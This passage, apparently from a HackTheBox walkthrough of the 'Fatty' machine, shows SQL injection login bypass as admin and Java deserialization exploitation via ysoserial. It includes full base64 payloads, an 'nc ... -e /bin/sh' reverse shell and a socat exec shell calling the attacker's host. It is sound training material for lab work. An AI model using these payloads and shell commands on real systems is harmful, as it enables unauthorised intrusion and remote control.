That’s useful for downloading text files, but will still fail getting a binary file. I’ll create a new function in `htb/fatty/client/methods/Invoker`, `openbin`, that starts as a copy of `open` (changes commented):

```

// change return from String to byte array
public byte[] openbin(final String foldername, final String filename) throws MessageParseException,                     MessageBuildException, IOException {
    final String methodName = new Object() {}.getClass().getEnclosingMethod().getName();
    Invoker.logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account -6";
    }
    (this.action = new ActionMessage(this.sessionID, "open")).addArgument(foldername);
    this.action.addArgument(filename);
    this.sendAndRecv();
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    byte[] response; // this is now byte array, not string
    try {
        response = this.response.getContent(); // change from getContentAsString to getContent
    }
    catch (Exception e) {
        response = "Error!";
    }
    return response;
}

```

Now I’ll update the code for the Download File button from above, with changes to call `openbin` instead of `open`:

```

downloadFileButton.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(final ActionEvent e) {
        if (ClientGuiTest.this.currentFolder == null) {
            JOptionPane.showMessageDialog(controlPanel, "No folder selected! List a directory first!", "Error", 0);
            return;
        }
        byte[] response = new byte[0];  // now byte array instead of string
        final String fileName = ClientGuiTest.this.fileTextField.getText();
        fileName.replaceAll("[^a-zA-Z0-9.]", "");
        try {
            response = ClientGuiTest.this.invoker.openbin(ClientGuiTest.this.currentFolder, fileName);
            OutputStream out = new FileOutputStream("./" + fileName); // will open file in local cwd
            out.write(response); // write result
            out.close();
        }
        catch (MessageBuildException | MessageParseException ex2) {
            JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
        }
        catch (IOException e3) {
            JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains,     please close and reopen the client.", "Error", 0);
        }
        textPane.setText("Wrote local file " + fileName + "."); // Print message instead of result
    }
});

```

Because the result is now a byte array and not a string, I don’t display it to the screen.

I can now download the server:

![image-20200327055528651](https://0xdfimages.gitlab.io/img/image-20200327055528651.png)

```

root@kali# file fatty-server.jar 
fatty-server.jar: Zip archive data, at least v1.0 to extract

```

## Shell as qtc in Container

### Admin Access

#### Identify SQLi

To look at this Jar, I’ll use [JD-GUI](http://java-decompiler.github.io/), which is nice for looking around a Jar file when you don’t need to edit it.

Since the notes mentioned SQLi, that’s the first place I wanted to look. Since most the commands I can interact with involve the file system, I’ll start with the login form. It starts with `htb/fatty/server/connection/ClientConnection`. There’s a `run` function that is listening and the first message, which needs to be a `loginMessage`. Once that’s verified, it calls `checkLogin` on the `User` returned from the `loginMessage`:

```

connectionUser = session.checkLogin(loginMessage.getUser());

```

The `User` object that is returned from `loginMessage.getUser()` is passed into `session.checkLogin`, and a different `User` object is returned and set to `connectionUser`.

The `checkLogin` function is in `htb/fatty/server/database/FattyDbSession`:

```

  public User checkLogin(User user) throws LoginException {
    Statement stmt = null;
    ResultSet rs = null;
    User newUser = null;
    try {
      stmt = this.conn.createStatement();
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
      try {
        Thread.sleep(3000L);
      } catch (InterruptedException e) {
        return null;
      } 
      if (rs.next()) {
        int id = rs.getInt("id");
        String username = rs.getString("username");
        String email = rs.getString("email");
        String password = rs.getString("password");
        String role = rs.getString("role");
        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
          return newUser; 
        throw new LoginException("Wrong Password!");
      } 
      throw new LoginException("Wrong Username!");
    } catch (SQLException e) {
      this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      return null;
    } 
  }

```

There is clearly SQLi in:

```

rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");

```

#### Find Use For SQLi

The real question is how to use this SQLi. I spent some time trying to figure out how to write a file to disk that might be useful. I spent some time trying to look for places I could write a file to disk (like an SSH key), but came up empty. I actually went looking elsewhere, but then found something interesting in `htb/fatty/server/methods/Commands` in the `changePW` function that I thought might be exploitable (more later). But to run that function, the connected user needs the role admin. At the start of that function, it checks:

```

  public static String changePW(ArrayList<String> args, User user) {
    logger.logInfo("[+] Method 'changePW' was called.");
    int methodID = 7;
    if (!user.getRole().isAllowed(methodID)) {
      logger.logError("[+] Access denied. Method with id '" + methodID + "' was called by user '" + user.getUsername() + "' with role '" + user.getRoleName() + "'.");
      return "Error: Method 'changePW' is not allowed for this user account";
    } 
    ...[snip]...

```

I can jump over to `htb/fatty/shared/resources/Role` and see that admin is allowed to do methods 1-12, and user is allowed 1-6:

```

  public static Role getAdminRole() {
    return new Role(0, "admin", new int[] { 
          1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 
          11, 12 });
  }
  
  public static Role getUserRole() {
    return new Role(0, "user", new int[] { 1, 2, 3, 4, 5, 6 });
  }
  ...[snip]...
  public boolean isAllowed(int id) {
    return IntStream.of(this.allowedMethods).anyMatch(x -> (x == id));
  }

```

#### SQLi To Login as Admin

Now with a goal, back to the `checkLogin` function. There’s the initial query (with `{}` representing input):

```

SELECT id,username,email,password,role FROM users WHERE username='{username}'

```

The results are used to populate a `User` object, `newUser`:

```

int id = rs.getInt("id");
String username = rs.getString("username");
String email = rs.getString("email");
String password = rs.getString("password");
String role = rs.getString("role");
newUser = new User(id, username, password, email, Role.getRoleByName(role), false);

```

Then the password is checked against the `User` object created from the `loginMessage` (`user`), and if they match, the `newUser` object is returned:

```

if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
    return newUser; 

```

This means that as long as I can make the usernames and passwords match, I can control the rest of the `User` object that’s returned, including the role!

I’ll need to know how a `User` object is created, and the constructors (code that’s run when an object is created, like `__init__` in Python) are in `htb/fatty/shared/resources/User`:

```

public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
        digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
    this.email = email;
    this.role = role;
}

public User(int uid, String username, String password, String email, Role role, boolean hash) {
    this(uid, username, password, email, role);
    if (!hash)
        this.password = password; 
}

```

The password is stored as `SHA256(username + password + "clarabibimakeseverythingsecure")`. For for qtc that looks like:

```

root@kali# echo -n "qtcclarabibiclarabibimakeseverythingsecure" | sha256sum 
5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046  -

```

I’ll want to run a query that looks like:

```

SELECT id,username,email,password,role FROM users WHERE username='0xdf' UNION SELECT 223,'qtc','0xdf@fatty.htb','5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046','admin'

```

The initial select will return nothing, and that will leave the row of data I want, which should match qtc where it matters, but also give me admin.

But when I submit this, it fails. Why? I had to walk through the process to figure it out. When I hit submit, the client creates a user:

```

ClientGuiTest.this.user = new User();
ClientGuiTest.this.user.setUsername(username);
ClientGuiTest.this.user.setPassword(password);

```

When `setPassword` is called, it hashes the username + the password + the salt string with SHA256, and then saves that as `hashString`:

```

public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
        digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
}

```

Because the username is part of this hash, the hash is no longer 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046. So on the server, it pulls from the database (or from my inject), and compares it to what is sent by the client. I had set the database on to the hash starting with 5a67, but the client one is now different.

Because I control both the client and the database response (via the SQLI), I can just force both of them to be the same string. I’ll add some code to the `User` class so that if I give it the password `0xdf`, it will set the password hash to `0xdf` instead of the hash. Then I can have my injection return that same string for the password.

```

public void setPassword(final String password) {
    // This if else is added
    if (password.equals("0xdf")) {
        this.password = "0xdf";
        System.out.printf("Set password to 0xdf\n");
    } else {
        final String hashString = this.username + password + "clarabibimakeseverythingsecure";
        MessageDigest digest = null;
        try {   
            digest = MessageDigest.getInstance("SHA-256");
        }
        catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        final byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
        this.password = DatatypeConverter.printHexBinary(hash);
    }           
}   

```

Now I’ll login with username `0xdf' UNION SELECT 223,'qtc','0xdf@fatty.htb','0xdf','admin` and password `0xdf`, and it works:

![image-20200327125412731](https://0xdfimages.gitlab.io/img/image-20200327125412731.png)

#### Enumerate as Admin

I can now run the various commands that were disabled before:

```
- File
  - Exit
- Profile
  - Whoami 
      Username: qtc
      Rolename: admin
  - ChangePassword
      Brings up a new panel, but says it's disabled
- Server Status
  - Uname
      Linux 032784d4da1d 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 Linux
  - Users
      total 4
      drwxr-sr-x    1 qtc      qtc           4096 Oct 30 11:11 qtc
  - Netstat
      Active Internet connections (only servers)
      Proto Recv-Q Send-Q Local Address           Foreign Address         State       
      tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
      tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      
      tcp        0      0 127.0.0.11:36929        0.0.0.0:*               LISTEN      
      tcp        0      0 :::22                   :::*                    LISTEN      
  - Ipconfig
      eth0      Link encap:Ethernet  HWaddr 02:42:AC:1C:00:04  
                inet addr:172.28.0.4  Bcast:172.28.255.255  Mask:255.255.0.0
                UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
                RX packets:4755 errors:0 dropped:0 overruns:0 frame:0
                TX packets:4120 errors:0 dropped:0 overruns:0 carrier:0
                collisions:0 txqueuelen:0 
                RX bytes:786696 (768.2 KiB)  TX bytes:4620874 (4.4 MiB)

      lo        Link encap:Local Loopback  
                inet addr:127.0.0.1  Mask:255.0.0.0
                UP LOOPBACK RUNNING  MTU:65536  Metric:1
                RX packets:52 errors:0 dropped:0 overruns:0 frame:0
                TX packets:52 errors:0 dropped:0 overruns:0 carrier:0
                collisions:0 txqueuelen:1 
                RX bytes:4212 (4.1 KiB)  TX bytes:4212 (4.1 KiB)
- FileBrowser
  - Configs
      .tmuxconfig
      sudoers.config
      .vimrc
      sshd_config
  - Notes
      security.txt
      shopping.txt
      schedule.txt
  - Mail
      report.txt
      dave.txt
      mom.txt
- ConnectionTest
  - Ping
      Pong
- Help
  - Contact
      This client was developed with <3 by qtc.
  - About
      Dear user,

      unfortunately we are currently very busy with writing new functionality for this awesome fatclient.This development takes so much time, that nobody of our staff was available for writing a useful help file so far.However, the client is written by our Java GUI experts who have tons of experience in creating user friendly GUIs.So theoretically, everything should be quite self explanatory. If you find bugs or have questions regarding specific features do not hesitate to contact us!

      If you have urgent problems with the client, you can always decompile it and look at the source code directly :)

```

The `ifconfig` looks like I’m likely in a container. That’s good to know. Also, the users command seems to be an `ls -l /home`, and it shows one user, qtc (though that could be filtered).

### Deserialization Exploit

#### Identifying Vulnerability

The thing that jumped out at me in `changePW` in the server code was that it was taking in a serialized user object and deserializing it:

```

public static String changePW(ArrayList<String> args, User user) {
    logger.logInfo("[+] Method 'changePW' was called.");
    int methodID = 7;
    if (!user.getRole().isAllowed(methodID)) {
        logger.logError("[+] Access denied. Method with id '" + methodID + "' was called by user '" + user.getUsername() + "' with role '" + user.getRoleName() + "'.");
        return "Error: Method 'changePW' is not allowed for this user account";
    } 
    String response = "";
    String b64User = args.get(0);
    byte[] serializedUser = Base64.getDecoder().decode(b64User.getBytes());
    ByteArrayInputStream bIn = new ByteArrayInputStream(serializedUser);
    try {
        ObjectInputStream oIn = new ObjectInputStream(bIn);
        User user1 = (User)oIn.readObject();
    } catch (Exception e) {
        e.printStackTrace();
        response = response + "Error: Failure while recovering the User object.";
        return response;
    } 
    response = response + "Info: Your call was successful, but the method is not fully implemented yet.";
    return response;
}

```

Deserialization vulnerabilities are a common class. [This excellent blog from FoxGlove](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/) goes into details on how this kind of vulnerability works in Java. Basically, the `User` class `implements Serializable`:

```

public class User implements Serializable {

```

From the FoxGlove article:

> When Java reads in a serialized object, the first thing it does after reading in the raw bytes is call the user-defined “readObject” method if it exists.

So if I pass in an object that includes a defined `readObject` method, that method will run. That’s code execution.

#### Client Mods

Before I can send the payload, I need to figure out how to from the client. The GUI code currently doesn’t even try to contact the server because it’s not implemented:

```

pwChangeButton.addActionListener(new ActionListener() {
    public void actionPerformed(ActionEvent e) {
        JOptionPane.showMessageDialog(passwordChange, "Not implemented yet.", "Error", 0);
        passwordChange.setVisible(false);
        controlPanel.setVisible(true);
    }
});

```

There is some code in `Invoker` that would implement this function if called:

```

public String changePW(String username, String newPassword) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {

    }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
        return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    User user = new User(username, newPassword);
    ByteArrayOutputStream bOut = new ByteArrayOutputStream();
    try {
        ObjectOutputStream oOut = new ObjectOutputStream(bOut);
        oOut.writeObject(user);
    } catch (IOException e) {
        e.printStackTrace();
        return "Failure while serializing user object";
    } 
    byte[] serializedUser64 = Base64.getEncoder().encode(bOut.toByteArray());
    this.action = new ActionMessage(this.sessionID, "changePW");
    this.action.addArgument(new String(serializedUser64));
    sendAndRecv();
    if (this.response.hasError())
        return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
}

```

I started by updating the GUI to add a Pwn option and updating the GUI panel that takes the password to now take a payload:

```

final JMenuItem changePassword = new JMenuItem("Pwn");
...[snip]...
final JPanel passwordChange = new JPanel();
passwordChange.setBounds(0, 0, 860, 638);
passwordChange.setVisible(false);
this.contentPane.add(passwordChange);
passwordChange.setLayout(null);
(this.textField_1 = new JTextField()).setBounds(355, 258, 263, 29);
passwordChange.add(this.textField_1);
this.textField_1.setColumns(10);
//final JLabel lblOldPassword = new JLabel("Old Password:");
final JLabel lblOldPassword = new JLabel("Payload:");
lblOldPassword.setFont(new Font("Dialog", 1, 14));
lblOldPassword.setBounds(206, 265, 131, 17);
passwordChange.add(lblOldPassword);
//final JLabel lblNewPassword = new JLabel("New Password:");
//lblNewPassword.setFont(new Font("Dialog", 1, 14));
//lblNewPassword.setBounds(206, 322, 131, 15);
//passwordChange.add(lblNewPassword);
//(this.textField_2 = new JTextField()).setBounds(355, 308, 263, 29);
//passwordChange.add(this.textField_2);
//this.textField_2.setColumns(10);
//final JButton pwChangeButton = new JButton("Change");
final JButton pwChangeButton = new JButton("Pwn");
pwChangeButton.setBounds(575, 349, 114, 25);
passwordChange.add(pwChangeButton);

```

Then I changed the `pwChangeButton` action:

```

pwChangeButton.addActionListener(new ActionListener() {
    @Override
    public void actionPerformed(final ActionEvent e) {
        //JOptionPane.showMessageDialog(passwordChange, "Not implemented yet.", "Error", 0);
        //passwordChange.setVisible(false);
        //controlPanel.setVisible(true);
        ClientGuiTest.this.invoker.rce(this.textField_1.getText())
    }
});

```

Now when I run it and I have a `Pwn` option (though it doesn’t do anything yet):

![image-20200327152331693](https://0xdfimages.gitlab.io/img/image-20200327152331693.png)

#### ysoserial

I’ve used [ysoserial](https://github.com/frohoff/ysoserial) to generate Java deserialization payloads before, for example in [Arkham from HackTheBox](/2019/08/10/htb-arkham.html). In the FoxGlove post, they show the Common Collections. I can see that Common Collections is included in the server Jar:

![image-20200327143134989](https://0xdfimages.gitlab.io/img/image-20200327143134989.png)

I can generate a payload like this:

```

root@kali# java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 'ping -c 1 10.10.14.19' | base64 -w0
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAFXBpbmcgLWMgMSAxMC4xMC4xNC4xOXQABGV4ZWN1cQB+AB4AAAABcQB+ACNzcQB+ABFzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgA6

```

#### Finding a Payload

This was *really* tricky because of how the box is locked down. Typically I test with a `ping -c 1 [my ip]`. It turns out, pings are blocked outbound from the container. Most of the shells I tried also didn’t work. There’s no Python, PHP, Perl, or Ruby on the box. There’s no Bash on the box. I even tried using this RCE to write my public SSH key into `/home/qtc/.ssh/authorized_keys`, but it didn’t work (when I got a shell, my public key was there, so I confirmed my guess that SSH is going to the host and not the container).

Luckily, there is `nc`. When I went back to basics and just tried a simple `nc` connection (no shell):

```

root@kali# java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc 10.10.14.19 443' | base64 -w0
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAH25jIC1oIDI+JjEgfCBuYyAxMC4xMC4xNC4xOSA0NDN0AARleGVjdXEAfgAeAAAAAXEAfgAjc3EAfgARc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AOg==

```

When I pasted that into the Payload box and hit Pwn, I got a connection:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:34075.

```

At least I know I have RCE, and that `nc` is on the box.

#### Shell

I rarely try the `-e` option for `nc` any more, but out of desperation, I tried:

```

root@kali# java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc 10.10.14.19 443 -e /bin/sh' | base64 -w0
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHW5jIDEwLjEwLjE0LjE5IDQ0MyAtZSAvYmluL3NodAAEZXhlY3VxAH4AHgAAAAFxAH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo=

```

Pasting that into the form and submitting, I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.174.
Ncat: Connection from 10.10.10.174:41299.
id
uid=1000(qtc) gid=1000(qtc) groups=1000(qtc)

```

### user.txt

With this frustratingly difficult shell, getting `user.txt` is slightly tricky. I can see it, but it prints empty:

```

pwd
/home/qtc
ls
user.txt
cat user.txt

```

`ls -l` shows it’s marked not readable, but I can change that:

```

ls -l
total 4
----------    1 qtc      qtc             33 Oct 30 11:10 user.txt
chmod +r user.txt
cat user.txt
7fab2c31************************

```

### Shell Upgrade

Annoyed at this shell, and assuming I had a while to go, I uploaded a [static socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) to the container using `wget` and `python3 -m http.server`. Then, with `socat` listening on Kali, I created a shell:

```

./socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:10.10.14.19:443

```

On my host:

```

root@kali# socat file:`tty`,raw,echo=0 tcp-listen:443,reuseaddr
/bin/sh: can't access tty; job control turned off
